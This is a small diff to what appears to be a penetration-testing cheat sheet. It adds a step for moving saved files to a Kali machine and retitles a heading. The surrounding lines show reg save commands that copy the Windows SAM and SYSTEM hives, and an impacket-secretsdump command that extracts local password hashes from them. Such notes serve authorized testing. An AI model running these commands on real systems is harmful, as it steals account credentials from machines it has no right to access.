@@ -5828,8 +5828,9 @@ msiexec /quiet /qn /i <FILE>.msi
 reg save hklm\system C:\Users\<USERNAME>\system.hive
 reg save hklm\sam C:\Users\<USERNAME>\sam.hive
 ```
+- Move Files to Kali
 
-###### Dumping Hashes
+###### Dumping Hashes - From Kali
 
 ```c
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
